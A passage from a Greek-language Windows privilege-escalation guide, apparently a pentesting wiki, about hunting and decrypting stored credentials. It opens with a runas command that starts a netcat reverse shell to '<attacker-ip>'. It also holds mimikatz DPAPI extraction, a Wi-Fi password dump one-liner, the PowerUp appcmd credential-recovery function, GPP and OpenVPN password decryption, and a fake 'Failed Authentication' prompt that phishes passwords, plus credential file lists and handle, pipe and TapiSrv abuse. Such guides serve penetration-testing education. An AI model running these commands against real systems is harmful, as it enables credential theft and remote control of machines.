Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred`, ώστε να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι τα mimikatz, lazagne, το [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), το [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, η οποία χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που περιλαμβάνουν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA των χρηστών, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα arguments (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία credentials που προστατεύονται από το master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για decrypt.\
Μπορείτε να **extract πολλά DPAPI** **masterkeys** από τη **memory** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας πρακτικός τρόπος αποθήκευσης encrypted credentials. Τα credentials προστατεύονται με τη χρήση του **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να γίνουν decrypt μόνο από τον ίδιο user στον ίδιο computer όπου δημιουργήθηκαν.

Για να κάνετε **decrypt** ένα PS credential από το αρχείο που το περιέχει, μπορείτε να εκτελέσετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Εντολές που εκτελέστηκαν πρόσφατα
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής διαπιστευτηρίων απομακρυσμένης επιφάνειας εργασίας**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή Sticky Notes σε Windows workstations για να **αποθηκεύουν passwords** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για αρχείο database. Αυτό το αρχείο βρίσκεται στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητάτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση passwords από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε τη διαδικασία υπό High Integrity level.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, είναι πιθανό να έχουν διαμορφωθεί ορισμένα **credentials** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe`.\
Οι installers **εκτελούνται με δικαιώματα SYSTEM** και πολλοί είναι ευάλωτοι σε **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files και Registry (Διαπιστευτήρια)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά SSH Host του Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys στο registry

Τα SSH private keys μπορούν να αποθηκεύονται μέσα στο registry key `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώριση μέσα σε αυτήν τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε ένα machine. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με το όνομα **SiteList.xml**

### Cached GPP Pasword

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων local administrator accounts σε μια ομάδα μηχανημάτων μέσω του Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος παρουσίαζε σημαντικά security flaws. Αρχικά, τα Group Policy Objects (GPOs), τα οποία αποθηκεύονταν ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε domain user. Επιπλέον, τα passwords μέσα σε αυτά τα GPPs, τα οποία ήταν κρυπτογραφημένα με AES256 χρησιμοποιώντας ένα δημοσίως τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους users να αποκτήσουν elevated privileges.

Για τον περιορισμό αυτού του κινδύνου, αναπτύχθηκε μια function που πραγματοποιεί scan για locally cached GPP files τα οποία περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Όταν εντοπιστεί ένα τέτοιο αρχείο, η function αποκρυπτογραφεί το password και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες σχετικά με το GPP και την τοποθεσία του αρχείου, βοηθώντας στον εντοπισμό και την αποκατάσταση αυτού του security vulnerability.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_ τα ακόλουθα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για τη λήψη των κωδικών πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Αρχεία καταγραφής
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια ενός διαφορετικού χρήστη** αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να **ζητήσετε** απευθείας από τον client τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά filenames που περιέχουν credentials**

Γνωστά αρχεία που παλαιότερα περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζητήστε σε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον RecycleBin

Θα πρέπει επίσης να ελέγξετε τον Κάδο για να αναζητήσετε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Browsers

Θα πρέπει να ελέγξετε για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα favourites των browsers, καθώς μπορεί να έχουν αποθηκευτεί εκεί κάποια **passwords**.

Tools για την εξαγωγή passwords από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **intercommunication** μεταξύ software components διαφορετικών γλωσσών. Κάθε COM component **ταυτοποιείται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων interfaces, τα οποία ταυτοποιούνται μέσω interface IDs (IIDs).

Οι COM classes και interfaces ορίζονται στο registry κάτω από τα **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται μέσω συγχώνευσης των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32**, το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό Browsers - COM DLL Overwriting: Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry InProcServer32, το οποίο περιέχει μια default value που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κάνετε privilege escalation**, εάν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό user.

Για να μάθετε πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση passwords σε αρχεία και registry**

**Αναζήτηση περιεχομένων αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε στο registry ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που έχω δημιουργήσει για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords και αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή password από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** διαφόρων εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) **με πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά δικαιώματα, αλλά κληρονομώντας όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Στη συνέχεια, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά δικαιώματα**, μπορείτε να αποκτήσετε το **ανοιχτό handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **εισάγετε ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε επίσης αυτή την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με τον τρόπο ελέγχου και κατάχρησης περισσότερων ανοιχτών handles διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία μεταξύ διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια λειτουργία που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε μη σχετιζόμενες διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν τα δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε προσφέρει την ευκαιρία να **αποκτήσετε υψηλότερα δικαιώματα**, υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **παρεμβολή σε επικοινωνία named pipe με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την απαρίθμηση και προβολή όλων των pipes για τον εντοπισμό privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv), σε λειτουργία server, εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος authenticated client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων events που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει ένα αυθαίρετο DLL ως η υπηρεσία. Πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` ρυθμισμένο σε μια υπάρχουσα διαδρομή με δικαίωμα εγγραφής → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων events.
- Κάθε event γράφει το ελεγχόμενο από τον attacker `InitContext` σε αυτό το handle, το οποίο ορίστηκε μέσω του `Initialize`. Καταχωρίστε μια line app με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε το μέσω του `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, κάντε unregister/shutdown για να επαναλάβετε τις ντετερμινιστικές εγγραφές.
